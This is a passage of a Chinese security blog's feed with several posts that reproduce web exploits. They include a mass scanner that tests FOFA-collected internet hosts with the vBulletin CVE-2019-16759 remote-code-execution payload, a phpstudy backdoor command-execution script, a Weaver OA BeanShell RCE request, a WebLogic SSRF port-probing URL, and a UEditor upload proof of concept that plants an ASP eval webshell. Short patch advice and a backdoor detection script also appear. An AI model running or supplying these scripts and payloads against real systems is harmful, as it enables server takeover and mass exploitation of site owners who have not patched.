    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>vBulletin 是一个强大，灵活并可完全根据自己的需要定制的商用论坛程序套件，在全球拥有数万用户且增长速度很快。</p><p>2019年9月23日，vBulletin v5（5.0.0-5.5.4）被爆出存在远程代码执行的漏洞利用代码，CVE编号：CVE-2019-16759。</p><h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>因为vBulletin为商用程序，而其用户群主要集中在欧美地区，这里直接使用fofa搜索线上环境测试一下。</p><p>搜索关键词<code>app=&quot;vBulletin&quot;</code>,得到一万多条结果</p><p><img src="https://i.loli.net/2019/10/08/UyixY1DVuvsXShC.png" alt></p><p>手动查看了一下大部分都是4.x版本，要不然就是漏洞不存在，这里直接批量获取批量测试一下。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">'app="vBulletin"'</span> | base64 - | xargs -I&#123;&#125; curl <span class="string">"https://fofa.so/api/v1/search/all?email=<span class="variable">$&#123;FOFA_EMAIL&#125;</span>&amp;key=<span class="variable">$&#123;FOFA_KEY&#125;</span>&amp;qbase64=&#123;&#125;"</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/08/EGljrXHMKQIA2Tg.png" alt></p><p>将获取到的内容保存到<code>vb.txt</code>然后进行批量检测</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> Queue</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Bruter</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, urls,threads)</span>:</span></span><br><span class="line"></span><br><span class="line">self.vb_urls = Queue.Queue()</span><br><span class="line">self.threads = threads</span><br><span class="line"><span class="keyword">for</span> u <span class="keyword">in</span> urls:</span><br><span class="line">self.vb_urls.put(u[<span class="number">0</span>])</span><br><span class="line"><span class="comment">#print self.vb_urls.get()</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">vb5_rce</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">with</span> threading.Lock():</span><br><span class="line"><span class="keyword">while</span> self.vb_urls.qsize() &gt; <span class="number">0</span>:</span><br><span class="line"></span><br><span class="line">target = self.vb_urls.get()</span><br><span class="line"><span class="keyword">if</span> <span class="string">'http'</span> <span class="keyword">not</span> <span class="keyword">in</span> target:</span><br><span class="line">target = <span class="string">'http://'</span>+target</span><br><span class="line">url = target+<span class="string">"/index.php?routestring=ajax/render/widget_php"</span></span><br><span class="line">headers = &#123;<span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Waterfox/56.2.14"</span>, <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>, <span class="string">"Accept-Language"</span>: <span class="string">"en-US,en;q=0.5"</span>, <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip, deflate"</span>, <span class="string">"Content-Type"</span>: <span class="string">"application/x-www-form-urlencoded"</span>, <span class="string">"Connection"</span>: <span class="string">"close"</span>, <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>&#125;</span><br><span class="line">data = &#123;<span class="string">"widgetConfig[code]"</span>: <span class="string">"echo shell_exec('echo boogle'); exit;"</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">res = requests.post(url, headers=headers, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'boogle'</span> <span class="keyword">in</span> res.text <span class="keyword">and</span> <span class="string">'exit'</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] '</span>+ target +<span class="string">' is vuluable '</span></span><br><span class="line">file_write(<span class="string">r'vb5_vulu_site.txt'</span>,target+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[-] '</span>+ target +<span class="string">' is not vuluable '</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[!] '</span>+ target +<span class="string">' error '</span></span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span>  range(self.threads):</span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] thread '</span>+ str(i)</span><br><span class="line">t = threading.Thread(target=self.vb5_rce)</span><br><span class="line">t.start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_url</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'vb.txt'</span>,<span class="string">'r'</span>)  <span class="keyword">as</span> f:</span><br><span class="line">r = json.loads(f.read())</span><br><span class="line">urls = r[<span class="string">'results'</span>]</span><br><span class="line"><span class="keyword">return</span> urls</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">file_write</span><span class="params">(name,results)</span>:</span></span><br><span class="line">    <span class="keyword">with</span> open(name,mode=<span class="string">'a'</span>) <span class="keyword">as</span> file:</span><br><span class="line">        file.write(results)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">urls = get_url()</span><br><span class="line">vb5_rce = Bruter(urls=urls,threads=<span class="number">10</span>)</span><br><span class="line">vb5_rce.run()</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/08/IzA8ogEO4uZdknK.png" alt></p><p>手动测试一下</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">widgetConfig[code]=echo shell_exec(<span class="string">'whoami'</span>); <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/10/08/faUyPWLIv7VlnXE.png" alt></p><p>至此复现成功，本文所有内容仅供测试，勿作他用。</p><h2 id="0x02-修复建议"><a href="#0x02-修复建议" class="headerlink" title="0x02 修复建议"></a>0x02 修复建议</h2><p><a href="http://members.vbulletin.com/patches.php" target="_blank" rel="noopener">官方</a>已出修复补丁，尽快进行下载修复。</p><p><img src="https://i.loli.net/2019/10/08/NB5XrgynTAqubF9.png" alt></p><h2 id="0x03-参考链接"><a href="#0x03-参考链接" class="headerlink" title="0x03 参考链接"></a>0x03 参考链接</h2><p><a href="https://seclists.org/fulldisclosure/2019/Sep/31" target="_blank" rel="noopener">https://seclists.org/fulldisclosure/2019/Sep/31</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;vBulletin 是一个强大，灵活并可完全根据自己的需要定制的商用论坛程序套件，在全球拥有数万用户
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码执行" scheme="http://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>phpstudy后门漏洞利用</title>
    <link href="http://zhengbao.wang/phpstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://zhengbao.wang/phpstudy后门漏洞利用/</id>
    <published>2019-09-26T11:32:41.000Z</published>
    <updated>2019-09-26T12:19:09.780Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>Phpstudy是国内的一款免费的PHP调试环境的程序集成包，其通过集成Apache、PHP、MySQL、phpMyAdmin不同版本软件于一身，一次性安装无需配置即可直接使用，具有PHP环境调试和PHP开发功能。对我这种小白来说简直就是一大神器，但就是这样一个伴随了我多达三年之久的神器，突然爆出被恶意植入远控后门，不多说，含泪测试一下自己。</p><p><img src="https://i.loli.net/2019/09/26/tuPLIB6fSvdFw3E.png" alt></p><h2 id="0x01-后门利用"><a href="#0x01-后门利用" class="headerlink" title="0x01 后门利用"></a>0x01 后门利用</h2><p><img src="https://i.loli.net/2019/09/26/uDvUm2Hqw6yJBxG.png" alt></p><p>poc</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests </span><br><span class="line"><span class="keyword">import</span> sys </span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Poc</span><span class="params">(ip,cmd)</span>:</span></span><br><span class="line">    cmd = <span class="string">'system('</span>+cmd+<span class="string">');'</span></span><br><span class="line">    poc = base64.b64encode(cmd)</span><br><span class="line">    print(poc)</span><br><span class="line">    <span class="comment">#poc = "c3lzdGVtKCdjYWxjLmV4ZScpOw=="</span></span><br><span class="line">    headers = &#123;</span><br><span class="line">    <span class="string">"User-Agent"</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0"</span>,</span><br><span class="line">    <span class="string">"Accept"</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">    <span class="string">"Accept-Language"</span>: <span class="string">"zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3"</span>,</span><br><span class="line">    <span class="string">"Connection"</span>: <span class="string">"close"</span>,</span><br><span class="line">    <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip,deflate"</span>,</span><br><span class="line">    <span class="string">"Accept-Charset"</span>: poc,</span><br><span class="line">    <span class="string">"Upgrade-Insecure-Requests"</span>: <span class="string">"1"</span>,</span><br><span class="line">    &#125;</span><br><span class="line">    url = ip</span><br><span class="line">    r = requests.get(url,headers=headers)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Administrator"</span> <span class="keyword">or</span> <span class="string">"DefaultAccount"</span> <span class="keyword">or</span> <span class="string">"Guest"</span> <span class="string">"hello phpstudy"</span><span class="keyword">in</span> r.text:</span><br><span class="line">        print(<span class="string">"[+] phpstudy is vuluable"</span>)</span><br><span class="line">        print(r.text.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">"[-] phpstudy is safe"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">3</span>:</span><br><span class="line">    print(<span class="string">"python phpstudy.py http://127.0.0.1 cmd"</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    Poc(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/26/He1lc9bJ2LzB6h8.png" alt></p><h2 id="0x02-后门检测"><a href="#0x02-后门检测" class="headerlink" title="0x02 后门检测"></a>0x02 后门检测</h2><p>附上pcat的一个检测脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf8 -*-</span></span><br><span class="line">__author__=<span class="string">'pcat@chamd5.org'</span></span><br><span class="line">__blog__=<span class="string">'http://pcat.cc'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strings</span><span class="params">(file)</span> :</span></span><br><span class="line">    chars = string.printable[:<span class="number">94</span>]</span><br><span class="line">    shortestReturnChar = <span class="number">4</span></span><br><span class="line">    regExp = <span class="string">'[%s]&#123;%d,&#125;'</span> % (chars, shortestReturnChar)</span><br><span class="line">    pattern = re.compile(regExp)</span><br><span class="line">    <span class="keyword">with</span> open(file, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> pattern.findall(f.read())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">grep</span><span class="params">(lines,pattern)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        <span class="keyword">if</span> pattern <span class="keyword">in</span> line:</span><br><span class="line">            <span class="keyword">yield</span> line</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pcheck</span><span class="params">(filename)</span>:</span></span><br><span class="line">    <span class="comment"># trojan feature</span></span><br><span class="line">    trojan=<span class="string">'@eval'</span></span><br><span class="line">    <span class="comment"># just check dll file</span></span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">'.dll'</span>):        </span><br><span class="line">        lines=strings(filename)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            grep(lines,trojan).next()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'=== &#123;0&#125; ==='</span>.format(filename)</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> grep(lines,trojan):</span><br><span class="line">            <span class="keyword">print</span> line</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">(php_path)</span>:</span></span><br><span class="line">    <span class="comment"># . stand for current directory</span></span><br><span class="line">    <span class="keyword">for</span> path, dirs, files <span class="keyword">in</span> os.walk(php_path, topdown=<span class="literal">False</span>):</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> files:</span><br><span class="line">            pcheck(os.path.join(path, name))</span><br><span class="line">        <span class="keyword">for</span> name <span class="keyword">in</span> dirs:</span><br><span class="line">            pcheck(os.path.join(path, name))</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"python check.py F:\phpstudy\PHPTutorial\php"</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        foo(sys.argv[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/26/tmgHVvXcsbk4T6E.png" alt></p><p><img src="https://i.loli.net/2019/09/26/cNKoW6TsS4gdty3.png" alt></p><h2 id="0x03-修复建议"><a href="#0x03-修复建议" class="headerlink" title="0x03 修复建议"></a>0x03 修复建议</h2><ul><li><p>及时清除后门文件并作安全检查看是否被种下其他后门</p></li><li><p>更新至最新版本，毕竟phpstudy还是给我们带来了很多的便捷，不能因噎废食。</p></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;Phpstudy是国内的一款免费的PHP调试环境的程序集成包，其通过集成Apache、PHP、MyS
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码执行" scheme="http://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>泛微OA远程代码执行漏洞利用</title>
    <link href="http://zhengbao.wang/%E6%B3%9B%E5%BE%AEOA%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://zhengbao.wang/泛微OA远程代码执行漏洞利用/</id>
    <published>2019-09-26T06:30:31.000Z</published>
    <updated>2019-10-05T03:02:33.296Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>泛微OA远程代码执行漏洞，泛微e-cology OA系统的JAVA Beanshell接口可被未授权访问，攻击者调用该Beanshell接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程命令执行。</p><p>影响版本：<code>7.0</code> <code>8.0</code> <code>8.1</code></p><h2 id="0x01-漏洞利用"><a href="#0x01-漏洞利用" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>通过访问泛微协同办公系统<code>weaver/bsh.servlet.BshServlet</code>，可直接访问Beanshell接口执行任意命令,post<code>bsh.script=exec(&quot;whoami&quot;);</code>即可执行命令。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/weaver/bsh.servlet.BshServlet</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: zhengbao.wang</span><br><span class="line"><span class="attribute">Content-Length</span>: 104</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Origin</span>: https://zhengbao.wang</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line"><span class="attribute">Referer</span>: http://zhengbao/weaver/bsh.servlet.BshServlet</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: testBanCookie=test; JSESSIONID=abcNcyM2yAMSeaWQ-nS1w</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"></span><br><span class="line">bsh.script=exec%28%22whoami%22%29%3B%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A%0D%0A</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/09/26/KBloHm7r9R3P21O.png" alt></p><h2 id="0x02-修复方式"><a href="#0x02-修复方式" class="headerlink" title="0x02 修复方式"></a>0x02 修复方式</h2><p>升级到泛微OA最新版本或安装官方BSH补丁包<a href="https://www.weaver.com.cn/cs/securityDownload.asp" target="_blank" rel="noopener">https://www.weaver.com.cn/cs/securityDownload.asp</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;泛微OA远程代码执行漏洞，泛微e-cology OA系统的JAVA Beanshell接口可被未授权
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="代码执行" scheme="http://zhengbao.wang/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>BEA Weblogic Server ssrf漏洞利用</title>
    <link href="http://zhengbao.wang/BEA-Weblogic-Server-ssrf%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    <id>http://zhengbao.wang/BEA-Weblogic-Server-ssrf漏洞利用/</id>
    <published>2019-09-26T02:28:03.000Z</published>
    <updated>2019-09-26T12:23:06.385Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>测试遇到了BEA Weblogic Server ssrf漏洞，记录一下。</p><h2 id="0x01-ssrf内网端口探测"><a href="#0x01-ssrf内网端口探测" class="headerlink" title="0x01 ssrf内网端口探测"></a>0x01 ssrf内网端口探测</h2><p>探测内网主机 10.10.0.217 2222端口</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>zhengbao.wang<span class="regexp">/uddiexplorer/</span>SearchPublicRegistries.jsp?operator=http:<span class="regexp">//</span><span class="number">10.10</span>.<span class="number">0.217</span>:<span class="number">2222</span>&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure><p>端口开放回显<code>did not have a valid SOAP content-type</code>,如下图</p><p><img src="https://i.loli.net/2019/09/26/NG3tCKqskW4uwDo.png" alt></p><p>探测1234端口，端口关闭回显<code>could not connect over HTTP to server</code>,如下图</p><p><img src="https://i.loli.net/2019/09/26/JZlQ3zy6qPdGU4H.png" alt></p><p>根据回显不同，可做内网端口探测。</p><p>其他关于ssrf的利用，可参见博客文章 <a href="https://zhengbao.wang/SSRF%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8%E5%A7%BF%E5%8A%BF">SSRF的一些利用姿势</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;测试遇到了BEA Weblogic Server ssrf漏洞，记录一下。&lt;/p&gt;
&lt;h2 id=&quot;
      
    
    </summary>
    
      <category term="web安全" scheme="http://zhengbao.wang/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="ssrf" scheme="http://zhengbao.wang/tags/ssrf/"/>
    
      <category term="weblogic" scheme="http://zhengbao.wang/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>UEditor .net版本任意文件上传</title>
    <link href="http://zhengbao.wang/UEditor-net%E7%89%88%E6%9C%AC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>http://zhengbao.wang/UEditor-net版本任意文件上传/</id>
    <published>2019-09-25T12:44:59.000Z</published>
    <updated>2019-09-25T12:49:27.784Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>今天在渗透过程中碰到了一个UEditor .net版本，刚好最近想更新下博客，记录一个getshell的过程。</p><h2 id="0x01-UEditor-net版本任意文件上传"><a href="#0x01-UEditor-net版本任意文件上传" class="headerlink" title="0x01 UEditor .net版本任意文件上传"></a>0x01 UEditor .net版本任意文件上传</h2><p>这个任意文件上传是18年8月份爆出来的，漏洞的成因是在获取图片资源时仅检查了ContentType，导致可以绕过达到任意文件上传。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (response.ContentType.IndexOf(<span class="string">"image"</span>) == -<span class="number">1</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                State = <span class="string">"Url is not an image"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>漏洞利用poc</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://xx/ueditor/net/controller.ashx?action=catchimage"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">p</span>&gt;</span>shell addr: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"source[]"</span> /&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"Submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure><p>然后在服务中构造绕过验证的一句话<code>submit</code>即可</p><p><img src="https://i.loli.net/2019/09/25/rjEqK5SJPvm19Gp.png" alt></p><p>因为这里只验证了contentType,所以可以在代码中伪造contentType,我所使用的为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">header(<span class="string">'Content-type: image/jpeg'</span>); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;% eval request(\"cmd\") %&gt;"</span>;</span><br><span class="line"><span 